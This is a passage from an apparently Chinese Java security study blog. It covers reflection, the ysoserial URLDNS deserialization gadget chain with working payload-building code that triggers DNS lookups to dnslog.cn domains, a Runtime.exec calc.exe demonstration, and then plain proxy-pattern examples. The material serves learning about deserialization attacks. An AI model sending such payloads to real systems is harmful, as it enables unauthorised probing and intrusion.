class="hljs-keyword">for</span> (Field field : personfields2) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">idfield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;id&quot;</span>);<br>System.out.println(idfield);<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">allfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(allfield);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png"></p><h3 id="2-2-4-获取类的方法-Method"><a href="#2-2-4-获取类的方法-Method" class="headerlink" title="2.2.4 获取类的方法 Method"></a>2.2.4 获取类的方法 Method</h3><ul><li>getMethod(String name, Class&lt;?&gt;… parameterTypes)：指定方法名和参数类型，可获得 public 方法（包含父类继承的）。</li><li>getMethods()：获得类及父类的所有 public 方法。</li><li>getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes)：指定方法名和参数类型，可获得本类声明的任意方法（包括 private、protected、默认、public）。</li><li>getDeclaredMethods()：获得类中声明的所有方法（不含父类）。</li></ul><h3 id="2-2-5-获取类的构造器-Constructor"><a href="#2-2-5-获取类的构造器-Constructor" class="headerlink" title="2.2.5 获取类的构造器 Constructor"></a>2.2.5 获取类的构造器 Constructor</h3><ul><li>getConstructor(Class&lt;?&gt;… parameterTypes)：指定参数类型，可获得 public 构造器。</li><li>getConstructors()：获得类的所有 public 构造器。</li><li>getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)：指定参数类型，可获得类的任意构造器（包括 private）。</li><li>getDeclaredConstructors()：获得类的所有构造器（不论修饰符）。</li></ul><h2 id="2-3-URLDNS-链"><a href="#2-3-URLDNS-链" class="headerlink" title="2.3 URLDNS 链"></a>2.3 URLDNS 链</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p>URLDNS 是  ysoserial 中的一个利用链：</p><ul><li><p>Gadget Chain:</p></li><li><pre><code class="hljs">HashMap.readObject()</code></pre></li><li><pre><code class="hljs">  HashMap.putVal()</code></pre></li><li><pre><code class="hljs">    HashMap.hash()</code></pre></li><li><pre><code class="hljs">      URL.hashCode()</code></pre></li></ul><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>首先是因为 HashMap（java&#x2F;util&#x2F;HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 <font style="color:#080808;background-color:#ffffff;">K key &#x3D; (K) s.readObject(); 进行反序列化，之后调用  putVal() -&gt; hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：</font><a href="#KmszU">HashMap 找入口类分析</a><font style="color:#080808;background-color:#ffffff;">】</font></p><p><font style="color:#080808;background-color:#ffffff;">接下来查看 URL（java&#x2F;net&#x2F;URL.java），URL 中继承了 </font><strong><font style="color:#080808;background-color:#ffffff;">Serializable，</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png"></p><p>跟进 hashCode</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png"></p><p><code>getHostAddress(u)</code> 会尝试把 URL 中的主机名解析成一个 <code>InetAddress</code> 对象（也就是 IP 地址）， 如果主机名解析成功（<code>addr</code> 不为 null），就把解析出来的 IP 地址的 <code>hashCode()</code> 加入到 <code>h</code>（整个 URL 的哈希值）里  ； 如果 DNS 没解析成功（<code>addr == null</code>），那就直接取 URL 原始的 <code>host</code> 字符串  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png"></p><p>跟进 getHostAddress，<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)方法会去解析主机名，</font></p><ul><li>如果 <code>host</code> 是 IP 地址，直接转换成 <code>InetAddress</code>，不会走 DNS</li><li>如果 <code>host</code> 是域名，这里就会向系统的 <strong>DNS 解析器</strong> 发起请求，解析成 IP</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png"></p><hr><hr><p><strong>完整的利用链：</strong></p><p> HashMap.readObject()</p><p>-&gt; HashMap.putVal()</p><p>-&gt; HashMap.hash()</p><p>-&gt; URL.hashCode()</p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()</p><p>-&gt; getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  【这里发出 DNS 请求】</font></p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9zuzrq.dnslog.cn&quot;</span>),<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>首先执行序列化，发现触发了dns 请求？</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png"></p><p>回到源码中：当 hashCode 不为 -1 时，直接返回 hashCode，不再执行下面代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png"></p><p>我们知道，第一次将 key（也就是 dnslog）传入 URL.hashCode 时，hashCode &#x3D;&#x3D; -1（-1 表示没有计算过），执行 hashCode &#x3D; handler.hashCode(this); ，而根据之前的分析，  handler.hashCode  -&gt; getHostAddress -&gt; InetAddress.getByName(host) -&gt; 发起dns请求，所以说，序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求。</p><p>那么如何不在第一次发起请求？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br><span class="hljs-comment">//这里不使用 put</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yjgubh.dnslog.cn&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//人为修改 URL.hashCode 缓存值，</span><br>hashcodefield.set(url,<span class="hljs-number">12134</span>);<br><span class="hljs-comment">//由于 hashCode != -1，它直接返回 12134，不会触发 DNS，只是把 URL 当 key 存进去</span><br><span class="hljs-comment">//存进去之后：此时 HashMap 内部只记录：key = URL(&quot;http://xx.dnslog.cn&quot;);key 的 hash 值 = 12134;value = 1</span><br>hashmap.put(url,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//反序列化之前把 hashcode 改回 -1,恢复 URL.hashCode 的默认状态,下一次调用 url.hashCode() 时，会重新计算并触发 DNS 解析</span><br>hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>序列化的过程就不会 DNS 解析：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png"></p><p>只有反序列化的时候触发 DNS 解析：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png"></p><h3 id="学习-ysoserial-中的-URLDNS："><a href="#学习-ysoserial-中的-URLDNS：" class="headerlink" title="学习 ysoserial 中的 URLDNS："></a>学习 ysoserial 中的 URLDNS：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//避免提前解析</span><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-comment">//创建 HashMap + URL</span><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                <span class="hljs-comment">//重置 URL 的缓存 hashCode</span><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress  和  SilentURLStreamHandler.openConnection  ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode &#x3D;&#x3D; -1，触发原本的 getHostAddress 触发 DNS 请求。</font></p><h2 id="2-4-利用-Runtime"><a href="#2-4-利用-Runtime" class="headerlink" title="2.4 利用 Runtime"></a>2.4 利用 Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo01;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 1. 获取 Runtime 类</span><br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 2. 获取 getRuntime() 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><br>        <span class="hljs-comment">// 3. 调用 getRuntime() 获取 Runtime 对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 4. 获取 exec(String) 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br>        <span class="hljs-comment">// 5. 调用 exec() 执行 calc.exe</span><br>        execMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png"></p><h1 id="3、JDK-动态代理"><a href="#3、JDK-动态代理" class="headerlink" title="3、JDK 动态代理"></a>3、JDK 动态代理</h1><p>参考文章：</p><blockquote><p><a href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv">代理模式(狂神)</a></p><p><font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font><a href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p></blockquote><p><strong>代理模式即 SpringAOP 的底层</strong></p><p><strong>代理模式分为静态代理和动态代理</strong></p><p>原型：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png"> </p><h2 id="3-1-静态代理"><a href="#3-1-静态代理" class="headerlink" title="3.1 静态代理"></a>3.1 <strong>静态代理</strong></h2><p>角色分析：</p><ul><li>抽象角色 ： 一般会使用接口或者抽象类来解决</li><li>真实角色 ：被代理角色</li><li>代理角色 ：代理真实角色，</li><li>客户 ：访问代理对象的人</li></ul><p>代理模式的好处：</p><ul><li>可以使真实角色的操作更加纯粹，不用关注一些公共的业务</li><li>公共也交给代理角色，实现了业务的分工</li><li>公共业务发生扩展的时候，方便集中管理</li></ul><p>缺点：</p><ul><li>一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//房东要租房子</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理，中介帮房东租房子，但是代理会有一些附属操作</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//你不用面对房东，直接找中介租房子</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//看房</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带你看房&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//收中介费</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介收取中介费&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//签租赁合同</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介签租赁合同&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png"></p><p>另一例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//真实对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;修改了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span 